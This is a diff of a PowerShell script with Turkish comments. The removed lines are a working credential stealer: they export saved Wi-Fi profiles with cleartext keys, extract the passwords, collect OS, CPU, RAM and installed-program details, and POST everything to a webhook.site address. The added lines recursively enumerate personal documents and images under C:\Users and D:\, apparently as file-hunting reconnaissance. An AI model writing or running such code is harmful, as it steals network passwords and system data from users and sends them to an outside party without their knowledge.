@@ -1,23 +1,18 @@
-$a = Get-ChildItem -Path "C:\Program Files\" | Where-Object { $_.PSIsContainer } | Select-Object Name
-$b = [System.IO.Path]::Combine($env:APPDATA)
-$c = Get-ChildItem -Path $b -Directory | Select-Object Name
-$f = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
-$q = Get-WmiObject -Class Win32_ComputerSystem | Select-Object TotalPhysicalMemory
-$p = Get-WmiObject -Class Win32_Processor | Select-Object Name, MaxClockSpeed, Manufacturer
+# Kontrol edilecek dosya uzantıları
+$extensions = @("*.pdf", "*.jpg", "*.jpeg", "*.png", "*.txt", "*.docx", "*.xlsx", "*.pptx")
 
+# Aranacak dizinler
+$searchPaths = @("C:\Users")
 
-netsh wlan export profile key=clear
-$e = "https://webhook.site/8bea2fc7-6683-4ca5-a089-c942c56cdd3a"
-powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
-$data = @{
-    "UserName" = [System.IO.Path]::Combine($env:APPDATA)
-    "OSInfo" = $f
-    "Main" = $a.Name
-    "User" = $c.Name
-    "Ram" = $q
-    "İşlemci" = $p
-    "Wifi Password" = Get-Content -Path Wi-Fi-PASS
+# D: sürücüsü varsa listeye ekle
+if (Test-Path "D:\") {
+    $searchPaths += "D:\"
 }
 
-$jsonData = $data | ConvertTo-Json
-Invoke-RestMethod -Uri $e -Method Post -Body $jsonData -ContentType "application/json"
+foreach ($searchPath in $searchPaths) {
+    foreach ($ext in $extensions) {
+        # Dosyaları bul ve tam yolunu listele
+        Get-ChildItem -Path $searchPath -Recurse -Filter $ext -ErrorAction SilentlyContinue |
+        ForEach-Object { $_.FullName }
+    }
+}
